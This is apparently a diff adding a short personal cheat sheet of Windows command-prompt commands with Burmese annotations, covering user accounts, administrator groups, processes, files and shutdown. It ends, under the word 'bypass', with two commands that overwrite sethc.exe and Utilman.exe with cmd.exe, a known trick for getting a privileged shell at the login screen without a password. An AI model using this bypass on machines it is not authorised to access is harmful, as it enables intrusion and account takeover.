@@ -1,0 +1,64 @@
+net  user  
+
+( မိမိစက်ထဲမှာ  Users  ဘယ်လောက်ရှိလဲဆိုတာကြည့် )
+
+net  user  "username"
+eg. net  user "Mg Mg"
+  မောင်မောင် အကောင့် နဲ့ပတ်သက်တာအသေးစိတ်ကြည့်
+
+net  user  /add  "username"  password
+eg. net  user  /add "Aung Aung"   123
+
+ အကောင့်သစ်တစ်ခုကို  Password  နဲ့တွဲဖွင့်
+
+net   user  "Aung Aung"   *
+
+ အောင်အောင်အကောင့်ကို  Password (Modify)  လုပ်  
+{ cmd  တွင် ရေးသော  password  များအား မပေါ်) 
+
+net  user  /delete  "username"
+
+ မိဖျက်ချင်သော  User  အား ဖျက်
+
+net localgroup Administrators
+
+add administrators
+net localgroup Administrators "user2" /add or / delete
+
+tasklist
+taskkill /im notepad.exe /f
+taskkill /f /pid ID number
+
+tasklist | findstr EX
+
+ren rename
+ren Test "Test_Test"
+md make 
+rd
+rmdir
+rd /s one
+
+histroy
+doskey /history
+
+
+*.* present all 
+
+dir
+dir /a
+echo "Hello Lady" > Note.txt
+
+shutdown -s -t 30 -c "bye bye baby"
+
+
+attribute
+
+attrib /?
+
+
+bypass
+copy E:\Windows\System\cmd.exe E:\Windows\System32\sethc.exe
+
+
+copy E:\Windows\System\cmd.exe E:\Windows\System32\Utilman.exe
+ 
